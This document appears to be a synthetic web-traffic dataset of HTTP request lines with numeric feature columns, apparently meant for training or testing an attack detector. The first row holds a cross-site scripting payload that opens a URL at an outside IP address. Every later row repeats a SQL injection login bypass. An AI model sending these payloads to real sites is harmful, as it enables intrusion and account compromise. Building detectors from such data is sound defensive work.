80,1,200,5953,8,30,16,6,2,GET /?name=<script>%window.open('http://23.42.205.52/459643')3C/script> HTTP/1.1
32,1,200,4816,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4516,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6516,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2031,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4218,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5428,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5754,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4886,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4785,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1898,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7102,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7617,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2298,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5773,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1626,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7791,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3636,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4910,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5373,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7339,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5063,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3176,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2889,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7438,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3527,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4436,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3542,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1762,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4849,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3594,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7705,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7298,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1263,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6307,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7505,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7730,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6217,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4322,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1783,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6329,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5451,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5584,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6722,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1269,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6831,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4922,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
